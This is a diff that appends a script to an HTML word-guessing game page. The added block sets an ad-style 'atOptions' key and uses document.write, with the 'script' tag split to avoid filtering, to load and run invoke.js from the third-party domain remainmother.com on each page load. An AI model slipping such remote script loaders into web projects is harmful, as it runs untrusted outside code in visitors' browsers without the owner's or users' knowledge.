@@ -131,5 +131,15 @@
         createKeyboard();
         displayWord();
     </script>
+    <script type="text/javascript">
+	atOptions = {
+		'key' : 'e96434ae552c2b401955a9d8014ca9b0',
+		'format' : 'iframe',
+		'height' : 60,
+		'width' : 468,
+		'params' : {}
+	};
+	document.write('<scr' + 'ipt type="text/javascript" src="//remainmother.com/e96434ae552c2b401955a9d8014ca9b0/invoke.js"></scr' + 'ipt>');
+</script>
 </body>
 </html>
